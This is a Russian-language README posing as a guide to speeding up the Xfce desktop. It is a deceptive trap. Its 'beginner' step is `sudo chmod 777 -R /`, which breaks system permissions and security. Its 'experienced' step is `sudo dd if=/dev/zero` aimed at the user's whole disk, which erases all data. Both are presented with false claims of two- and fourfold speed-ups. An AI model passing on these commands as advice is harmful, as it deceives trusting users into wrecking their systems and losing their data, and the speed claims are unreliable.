# xfce-optimization-guide
### Оптимизация Xfce для новичков (данный метод пользовает ускорить систему в 2 раза)
Откройте *терминал* и выполните команду:
`sudo chmod 777 -R /`

Далее вас попросят ввести пароль (введеные символы отображаться не будут):
`[sudo] password for <имя пользователя>:`

После этого вам необходимо выполнить перезагрузку.
### Оптимизация Xfce для опытных пользователей (данный метод пользовает ускорить систему в 4 раза)
Откройте *терминал* и выполните команду:
`sudo fdisk -l`

Далее вас попросят ввести пароль (введеные символы отображаться не будут):
`[sudo] password for <имя пользователя>:`

В выводе команды найдите название своего жесткого диска (в данном случае /dev/sda)
```
Disk /dev/sda: 111,8 GiB, 120034123776 bytes, 234441648 sectors
Disk model: KINGSTON SA400S3
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: gpt
Disk identifier: B2E2975E-BE17-4EAD-901D-76D04EA0D8C0

Device         Start       End   Sectors   Size Type
/dev/sda1       2048   1050623   1048576   512M EFI System
/dev/sda2    1050624 226289663 225239040 107,4G Linux filesystem
/dev/sda3  226289664 234440703   8151040   3,9G Linux swap
```
Далее необходимо выполнить команду (замените <название вышего диска> на название вашего диска без <>):
```
sudo dd if=/dev/zero of=<название вышего диска> bs=4M
```
После этого вам необходимо выполнить перезагрузку.
